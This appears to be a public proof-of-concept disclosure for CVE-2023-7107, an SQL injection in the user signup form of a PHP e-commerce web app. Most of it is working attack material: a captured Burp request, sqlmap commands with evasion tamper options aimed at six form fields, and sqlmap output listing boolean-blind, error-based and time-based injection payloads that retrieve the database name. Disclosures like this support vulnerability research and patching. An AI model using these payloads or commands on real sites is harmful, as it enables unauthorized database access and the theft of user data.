# CVE-2023-7107_E-Commerce Website - SQL Injection 3
+ **Exploit Title:** E-Commerce Website - SQL Injection 3
+ **Date:** 2023-24-12
+ **Exploit Author:** Hamdi Sevben
+ **Vendor Homepage:** https://code-projects.org/e-commerce-website-in-php-with-source-code/
+ **Software Link:** https://download-media.code-projects.org/2020/01/E-COMMERCE_WEBSITE_IN_PHP_WITH_SOURCE_CODE.zip
+ **Version:** 1.0
+ **Tested on:** Windows 10 Pro + PHP 8.1.6, Apache 2.4.53
+ **CVE:** CVE-2023-7107

## References: 
+ **CVE-2023-7107:** https://vuldb.com/?id.249002
+ https://www.cve.org/CVERecord?id=CVE-2023-7107

##  Description:
E-Commerce Website 1.0 allows SQL Injection via parameters 'firstname', 'middlename', 'email', 'address', 'contact' and 'username' in "/Electricks/Electricks-shop/pages/user_signup.php".
Exploiting this issue could allow an attacker to compromise the application, access or modify data,  or exploit latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to the user registration form: "http://localhost/Electricks/Electricks-shop/pages/user_signup.php"
+ Fill the the all form and click Create Account button.
+ Intercept the request via Burp Suite and send to Repeater.
+ Copy and paste the request to a "r.txt" file.
+ Captured Burp request:
```
POST /Electricks/Electricks-shop/pages/user_signup.php HTTP/1.1
Host: localhost
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: en-us,en;q=0.5
Cache-Control: no-cache
Content-Length: 427
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=sdqvs3v86m3s0vdqik7c5uah4g
Referer: http://localhost/Electricks/Electricks-shop/pages/user_signup.php
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36

submit=test&address=test&username=Test&email=test%40example.com&lastname=Test&middlename=Test&firstname=Test&contact=test&password=Pass
```

+ Use sqlmap to exploit. In sqlmap, use 'firstname', 'middlename', 'email', 'address', 'contact' and 'username' parameters to dump the database. 
```
python sqlmap.py -r r.txt -p firstname --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
```

```
---
Parameter: firstname (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: submit=test&address=test&username=Test&email=test@example.com&lastname=Test&middlename=Test&firstname=Test'||(SELECT 0x4675586a WHERE 8114=8114 AND 5578=5578)||'&contact=test&password=Pass

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: submit=test&address=test&username=Test&email=test@example.com&lastname=Test&middlename=Test&firstname=Test'||(SELECT 0x59676a78 WHERE 1465=1465 AND (SELECT 6021 FROM(SELECT COUNT(*),CONCAT(0x7170707671,(SELECT (ELT(6021=6021,1))),0x717a707171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a))||'&contact=test&password=Pass

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: submit=test&address=test&username=Test&email=test@example.com&lastname=Test&middlename=Test&firstname=Test'||(SELECT 0x4a6a6e4b WHERE 2213=2213 AND (SELECT 8358 FROM (SELECT(SLEEP(5)))jkvt))||'&contact=test&password=Pass
---
[22:05:28] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.1.6, Apache 2.4.53
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[22:05:28] [INFO] fetching current database
[22:05:28] [INFO] resumed: 'electricks'
current database: 'electricks'
```

+ current database: `electricks`
![4](https://github.com/h4md153v63n/CVEs/assets/5091265/bfffd456-06bc-42e9-b55e-ee361a6b8fb6)

+ Try to dump the db on other 5 parameters:
```
python sqlmap.py -r r.txt -p middlename --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
python sqlmap.py -r r.txt -p email --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
python sqlmap.py -r r.txt -p address --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
python sqlmap.py -r r.txt -p contact --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
python sqlmap.py -r r.txt -p username --risk 3 --level 5 --random-agent tamper=between,randomcase --dbms mysql --batch --current-db
```
